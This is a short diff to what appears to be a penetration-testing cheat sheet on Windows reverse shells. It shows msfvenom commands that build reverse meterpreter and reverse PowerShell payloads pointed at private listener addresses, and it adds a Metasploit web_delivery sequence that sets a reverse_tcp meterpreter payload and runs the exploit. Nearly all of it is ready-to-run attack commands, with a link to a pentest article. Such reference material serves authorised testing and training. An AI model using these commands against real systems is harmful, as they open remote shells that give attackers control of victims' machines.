@@ -79,12 +79,23 @@ msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 pre
 ```
 
 
-
-
-powershell:
+Powershell:
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=192.168.63.128 lport=3434 > reverse.bat 
 ```
+
+
+Web_Delivery:
+```bash
+use exploit/multi/script/web delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost <IP>
+set lport <port>
+exploit
+```
+
+
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
